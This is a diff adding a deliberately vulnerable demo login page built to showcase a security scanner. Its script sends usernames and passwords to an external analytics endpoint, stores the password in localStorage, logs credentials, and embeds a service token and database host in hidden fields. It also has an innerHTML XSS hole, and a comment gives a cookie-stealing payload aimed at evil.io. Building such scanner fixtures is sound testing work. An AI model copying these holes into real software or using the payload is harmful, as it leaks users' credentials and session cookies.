@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<!--
+  DEMO FILE — intentional vulnerabilities for security scanner showcase.
+
+  CWE findings  : CWE-312 (Cleartext Storage of Credentials — localStorage),
+                  CWE-311 (Missing Encryption — credentials logged in plaintext),
+                  CWE-522 (Insufficiently Protected Credentials — form action to 3rd party),
+                  CWE-79  (XSS via username rendered in error message)
+  Secrets       : internal service token in hidden form field, DB host exposed
+  Exfiltration  : credentials sent to external analytics endpoint on every login attempt
+  Permission    : form submits to third-party SSO endpoint with internal redirect URL embedded
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AcmeCorp — Login</title>
+</head>
+<body>
+  <h1>Sign In</h1>
+
+  <!--
+    PERMISSION — form action sends credentials to a third-party endpoint.
+    Hidden fields leak internal infrastructure details (token, DB host, redirect URL).
+  -->
+  <form id="login-form" action="https://auth.third-party-sso-provider.io/login" method="POST">
+    <label>Username <input type="text"     name="username"     id="username" autocomplete="username"></label>
+    <label>Password <input type="password" name="password"     id="password" autocomplete="current-password"></label>
+
+    <!-- SECRETS — internal token and DB host exposed in HTML source to any user -->
+    <input type="hidden" name="redirect_to"     value="https://internal-portal.acmecorp.internal">
+    <input type="hidden" name="internal_token"  value="svc_auth_relay_token_xyz123abc456def789">
+    <input type="hidden" name="db_host"         value="prod-db.acmecorp.internal:5432">
+    <input type="hidden" name="app_env"         value="production">
+
+    <button type="submit">Login</button>
+  </form>
+
+  <div id="error-msg"></div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // EXFILTRATION — taint: credentials → external analytics on every login attempt
+      // Attacker who compromises the analytics endpoint harvests all usernames + passwords
+      fetch('https://login-events.user-analytics-cdn.io/track', {
+        method : 'POST',
+        body   : JSON.stringify({ username, password, ts: Date.now(), url: location.href }),
+        mode   : 'no-cors',
+      });
+
+      // CWE FINDING — CWE-312: credentials stored in localStorage in cleartext
+      localStorage.setItem('savedUsername', username);
+      localStorage.setItem('savedPassword', password);  // Never store passwords in localStorage
+
+      // CWE FINDING — CWE-311: credentials logged to console (appears in browser logs / SIEM)
+      console.log('[DEBUG] Login attempt:', { username, password });
+    });
+
+    // CWE FINDING — CWE-79: XSS — error message from URL parameter rendered via innerHTML
+    // Attack: ?error=<script>document.location='https://evil.io/?c='+document.cookie</script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const error     = urlParams.get('error');
+    if (error) {
+      document.getElementById('error-msg').innerHTML = '<p class="error">' + error + '</p>';
+    }
+
+    // Autofill from localStorage — reintroduces saved plaintext password into form
+    window.addEventListener('load', function() {
+      const saved = localStorage.getItem('savedUsername');
+      if (saved) document.getElementById('username').value = saved;
+    });
+  </script>
+</body>
+</html>
